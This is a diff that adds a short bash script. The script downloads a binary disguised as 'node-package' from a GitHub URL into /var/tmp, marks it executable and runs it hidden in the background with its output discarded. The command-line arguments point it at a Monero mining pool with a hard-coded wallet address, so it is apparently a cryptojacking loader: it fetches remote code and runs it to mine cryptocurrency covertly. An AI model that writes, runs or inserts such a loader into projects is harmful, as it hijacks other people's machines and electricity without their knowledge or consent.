@@ -1,0 +1,23 @@
+#!/bin/bash
+
+# Exit on error
+set -e
+
+# Variables
+URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
+TARGET_DIR="/var/tmp"
+FILENAME="node-package"
+FULL_PATH="$TARGET_DIR/$FILENAME"
+
+# Ensure target directory exists
+mkdir -p "$TARGET_DIR"
+
+# Download the file to /var/tmp
+echo "Downloading to $FULL_PATH..."
+curl -L -o "$FULL_PATH" "$URL"
+
+# Make it executable
+chmod +x "$FULL_PATH"
+
+# Run silently in background
+nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
